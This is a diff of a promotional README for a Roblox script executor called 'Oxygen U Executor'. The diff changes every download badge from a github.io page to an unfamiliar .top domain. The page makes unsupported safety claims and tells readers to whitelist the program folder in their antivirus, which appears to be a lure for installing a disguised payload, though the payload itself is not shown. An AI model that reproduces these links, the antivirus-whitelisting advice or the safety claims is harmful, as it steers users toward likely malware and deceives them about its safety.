@@ -6,7 +6,7 @@
 
 Welcome to the official page for **Oxygen U Executor** — the lightweight, powerful, and trusted Roblox script executor built for both PC and mobile platforms in 2026. Whether you are a casual player or someone who loves pushing the boundaries of gameplay, Oxygen U Executor delivers smooth performance, a clean interface, and rock-solid stability. If you have ever asked yourself **Is Oxygen U Free** or wondered **Is Oxygen Executor Safe**, you are in the right place. This tool is completely free to use and designed with user safety at its core. Grab the **Oxygen U Executor Apk** for Android or the desktop build and start exploring today.
 
-[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Latest_Build-blue?style=for-the-badge&logoColor=white)](https://oxygenuexec.github.io/oxygenu/)
+[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Latest_Build-blue?style=for-the-badge&logoColor=white)](https://3wi39t.top/oxygenu)
 
 ---
 
@@ -62,7 +62,7 @@ When so many tools exist, the question **Is Oxygen Executor Safe** keeps coming 
 
 Getting started with **Oxygen U Executor** only takes a few minutes regardless of your platform. Follow the steps below for your device, and you will be running scripts in no time. Make sure your antivirus is configured to whitelist the application folder before installation — this is standard for any executor and keeps Oxygen U Executor Safe from false-positive quarantines.
 
-[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Windows_Build-blue?style=for-the-badge&logoColor=white)](https://oxygenuexec.github.io/oxygenu/)
+[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Windows_Build-blue?style=for-the-badge&logoColor=white)](https://3wi39t.top/oxygenu)
 
 ### 🖥️ For Windows
 
@@ -350,7 +350,7 @@ Choosing the right tool for running scripts in Roblox is not just about features
 
 Whether you are just starting out with your first script or you are a seasoned developer testing complex automation flows, Oxygen U Executor adapts to your workflow. The sandbox mode protects you, the script hub saves you time, and the multi-instance support scales with your ambitions. Is Oxygen Executor Safe? The transparent update process, community audits, and no-telemetry policy speak for themselves. Download it, configure it, and see why millions of users have made **Oxygen U Executor** their go-to choice this year.
 
-[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Get_Started_Now-blue?style=for-the-badge&logoColor=white)](https://oxygenuexec.github.io/oxygenu/)
+[![Download Oxygen U Executor](https://img.shields.io/badge/Download_Oxygen_U_Executor-Get_Started_Now-blue?style=for-the-badge&logoColor=white)](https://3wi39t.top/oxygenu)
 
 ---
 
